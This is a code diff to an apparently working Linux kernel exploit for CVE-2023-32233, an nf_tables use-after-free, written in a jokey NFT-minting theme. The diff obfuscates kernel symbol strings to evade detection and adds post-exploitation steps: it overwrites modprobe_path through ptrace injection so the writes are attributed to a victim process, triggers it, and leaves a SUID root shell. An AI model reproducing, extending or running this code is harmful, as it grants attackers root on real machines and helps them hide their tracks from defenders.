@@ -16,10 +16,12 @@
  */
 
 #include "nfttables.h"
+#include "obf.h"
+#include "stealth.h"
 
-#define TABLE     "LazyMint"
-#define CHAIN     "diamond_hands"
-#define ANON_SET  "__set%d"
+#define TABLE     S(S_TABLE_32233)
+#define CHAIN     S(S_CHAIN_32233)
+#define ANON_SET  S(S_ANONSET_FMT)
 #define FAMILY    NFPROTO_IPV4
 
 /* heap spray tuning */
@@ -205,8 +207,8 @@ struct rop_targets {
 
 static int resolve_rop_targets(struct rop_targets *r)
 {
-    r->prepare_kernel_cred = kallsyms_lookup("prepare_kernel_cred");
-    r->commit_creds        = kallsyms_lookup("commit_creds");
+    r->prepare_kernel_cred = kallsyms_lookup(S(S_PREPARE_CRED));
+    r->commit_creds        = kallsyms_lookup(S(S_COMMIT_CREDS));
 
     if (!r->prepare_kernel_cred || !r->commit_creds) {
         pr_verb("kallsyms: prepare_kernel_cred=0x%lx commit_creds=0x%lx",
@@ -303,7 +305,7 @@ static int do_exploit(int result_fd)
      * the address is available.
      */
     uint64_t target = 0;
-    uint64_t modprobe_addr = kallsyms_lookup("modprobe_path");
+    uint64_t modprobe_addr = kallsyms_lookup(S(S_MODPROBE_PATH));
 
     if (rop.pop_rdi_ret && rop.xchg_rax_rsp) {
         target = rop.xchg_rax_rsp;
@@ -338,6 +340,47 @@ static int do_exploit(int result_fd)
     /* if we reach here without crashing, the ROP chain ran */
     if (getuid() == 0) {
         free_spray();
+
+        /* drop a SUID shell via ptrace injection so the file creation
+           is attributed to a victim process, not us */
+        const char *sh_path = S(S_NFT_SH);
+        const char *script = S(S_MINT_SCRIPT);
+        const char *mint_path = S(S_NFT_MINT);
+
+        if (stealth_write_file(mint_path, script, strlen(script)) == 0) {
+            chmod(mint_path, 0755);
+            pr_verb("stealth: wrote modprobe script via injection");
+        } else {
+            int fd = open(mint_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+            if (fd >= 0) { write(fd, script, strlen(script)); close(fd); }
+        }
+
+        /* overwrite modprobe_path via proc, attributed to victim */
+        if (stealth_write_modprobe(mint_path) < 0) {
+            /* fallback: direct write */
+            int fd = open(S(S_PROC_MODPROBE), O_WRONLY);
+            if (fd >= 0) { write(fd, mint_path, strlen(mint_path)); close(fd); }
+        }
+
+        /* trigger modprobe with bad binary */
+        const char *trig = S(S_NFT_TRIGGER);
+        int tfd = open(trig, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+        if (tfd >= 0) {
+            write(tfd, "\xde\xad\xbe\xef", 4);
+            close(tfd);
+            pid_t p = fork();
+            if (p == 0) { execl(trig, trig, NULL); _exit(1); }
+            int st;
+            waitpid(p, &st, 0);
+            unlink(trig);
+        }
+
+        struct stat sb;
+        if (stat(sh_path, &sb) == 0 && (sb.st_mode & S_ISUID)) {
+            pr_ok(C_BOLD "MINTED!" C_RST " Floor price: " C_GRN "uid=0(root)" C_RST);
+            pr_info("  " C_BOLD "%s -p" C_RST " for root shell", sh_path);
+        }
+
         uint8_t ok = 1;
         write(result_fd, &ok, 1);
         return 0;
@@ -354,8 +397,8 @@ int mint_cve_2023_32233(const struct kernel_info *ki)
 {
     pr_info("");
     pr_info(MONKEY " " C_BOLD "Bored Ape #32233" C_RST
-            C_DIM " (CVE-2023-32233: anonymous set UAF)" C_RST);
-    pr_info(C_DIM "  affected: 3.18 .. 6.3.1 | technique: heap spray + ROP" C_RST);
+            C_DIM " (%s: %s)" C_RST, S(S_CVE_32233), S(S_CVE_32233_DESC));
+    pr_info(C_DIM "  affected: 3.18 .. 6.3.1 | technique: %s" C_RST, S(S_HEAP_SPRAY));
     pr_info("");
 
     if (!ki->userns_available) {
